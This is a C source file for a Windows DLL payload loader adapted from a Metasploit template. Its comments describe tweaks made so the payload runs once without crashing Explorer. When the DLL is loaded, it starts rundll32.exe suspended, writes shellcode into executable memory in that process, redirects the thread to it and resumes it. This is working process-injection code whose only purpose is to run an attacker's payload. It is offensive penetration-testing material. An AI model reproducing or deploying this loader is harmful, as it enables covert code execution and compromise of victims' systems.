// Based on https://github.com/rapid7/metasploit-framework/tree/cac890a797d0d770260074dfe703eb5cfb63bd46/data/templates/src/pe/dll
// - removed ExitThread(0) to prevent an Explorer crash
// - added Mutex to prevent invoking payload multiple times (at least try)
#include <windows.h>
#include "template.h"

void inline_bzero(void *p, size_t l)
{
	BYTE *q = (BYTE *)p;
	size_t x = 0;
	for (x = 0; x < l; x++)
		*(q++) = 0x00;
}

void ExecutePayload(void);

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		ExecutePayload();
		break;

        case DLL_PROCESS_DETACH:
		break;

        case DLL_THREAD_ATTACH:
		break;

        case DLL_THREAD_DETACH:
		break;
	}

	return TRUE;
}

void ExecutePayload(void)
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	CONTEXT ctx;
	LPVOID ep;
	HANDLE hMutex;
	SECURITY_ATTRIBUTES MutexAttributes;

	inline_bzero(&MutexAttributes, sizeof(MutexAttributes));
	MutexAttributes.nLength = sizeof(MutexAttributes);
	MutexAttributes.bInheritHandle = TRUE; // inherit the handle
	hMutex = CreateMutex(&MutexAttributes, TRUE, "MsfMutex");
	if(hMutex == NULL)
	{
		return;
	}

	if(GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(hMutex);
		return;
	}

	if(GetLastError() == ERROR_ACCESS_DENIED)
	{
		CloseHandle(hMutex);
		return;
	}

	// Start up the payload in a new process
	inline_bzero(&si, sizeof(si));
	si.cb = sizeof(si);

	// Create a suspended process, write shellcode into stack, make stack RWX, resume it
	if(CreateProcess(NULL, "rundll32.exe", NULL, NULL, TRUE, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
		ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
		GetThreadContext(pi.hThread, &ctx);

		ep = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SCSIZE, 0);

#ifdef _WIN64
		ctx.Rip = (DWORD64)ep;
#else
		ctx.Eip = (DWORD)ep;
#endif

		SetThreadContext(pi.hThread, &ctx);
		ResumeThread(pi.hThread);

		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}

	CloseHandle(hMutex);
}

